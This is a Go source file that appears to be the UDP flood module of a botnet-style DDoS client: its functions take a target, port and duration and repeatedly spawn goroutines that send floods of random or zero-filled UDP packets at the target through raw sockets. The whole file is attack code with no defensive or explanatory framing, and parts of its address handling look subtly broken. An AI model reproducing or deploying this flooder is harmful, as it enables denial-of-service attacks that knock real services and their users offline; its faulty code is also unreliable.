package methods

import (
	"fmt"
	"homo/client/balancer"
	"homo/client/utils"
	"net"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func Udp(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go udpcon(target, port)
		time.Sleep(100 * time.Millisecond)
		go udpcon(target, port)
	}

}

func udpcon(target string, port string) {
UDP:
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)

	if err != nil {
		fmt.Println(err)
		goto UDP
	}

	for i := 0; i < 20; i++ {
		select {
		case <-balancer.BalanceCh:

			fmt.Println("balancer")
			time.Sleep(5 * time.Second)
		default:

			fmt.Println(i)
			go sendudp(target, port, fd, "nilpayload", 12000)
			go sendudp(target, port, fd, "maxpayload", 2000)
			go sendudp(target, port, fd, "random", 1000)

			time.Sleep(500 * time.Millisecond)
		}
	}
}

func sendudp(target string, port string, fd int, payload string, size int) {

	ip, _, err := net.ParseCIDR(target + "/" + port)

	if err != nil {
		fmt.Println(err)
		return
	}

	var packet []byte

	switch payload {
	case "nilpayload":
		payload := make([]byte, size)

		payload = append(payload, byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)))
		packet = payload
	case "maxpayload":
		payload := make([]byte, 0)

		for i := 0; i <= size; i++ {
			payload = append(payload, byte(utils.RandomInt(2)))
		}

		packet = payload

	case "random":
		var bytestr string

		for i := 0; i <= size; i++ {
			bytestr += strconv.Itoa(utils.RandomInt(2))
		}

		var res string
		for _, i := range bytestr {
			res += string(i >> 4 * 4)
		}
		packet = []byte(res)

	}

	_port, _ := strconv.Atoi(port)

	_ip := strings.ReplaceAll(string(ip.To4()), ".", ",")

	addr := syscall.SockaddrInet4{
		Port: _port,
		Addr: [4]byte(net.IP(_ip)),
	}
	err = syscall.Sendto(fd, packet, 0, &addr)
	// fmt.Println(len(payload))
	if err != nil {
		fmt.Println(err)
		return
	}
}
